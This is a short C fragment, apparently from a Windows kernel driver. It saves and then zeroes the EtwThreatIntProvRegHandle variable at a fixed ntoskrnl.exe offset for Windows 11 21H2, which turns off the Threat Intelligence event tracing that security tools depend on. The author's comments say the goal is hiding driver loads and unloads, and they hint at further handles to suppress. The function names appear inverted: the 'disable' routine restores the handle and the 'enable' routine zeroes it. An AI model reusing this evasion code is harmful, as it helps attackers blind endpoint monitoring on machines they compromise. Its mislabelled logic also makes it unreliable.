// Offset is for Windows 11 21H2
// There's more handles to zero, but I'll leave it to the reader to find them. This alone won't perfectly hide a driver loading & unloading.
// For example, you'll also have to stop symbolic links from being logged.
// If you need help contact me on discord: Hiiiii#5658

ULONG64 EtwThreatIntProvRegHandle_offset = 0xC15D78;
ULONG64 old_EtwThreatIntProvRegHandle = 0ULL;

__forceinline VOID get_EtwThreatIntProvRegHandle()
{
    old_EtwThreatIntProvRegHandle = *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset);
}

__forceinline VOID disable_threat_tracing()
{
    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = old_EtwThreatIntProvRegHandle;
}

__forceinline VOID enable_thread_tracing()
{
    *(ULONG64*)((ULONG64)get_ldr_entry(L"ntoskrnl.exe") + EtwThreatIntProvRegHandle_offset) = 0ULL;
}
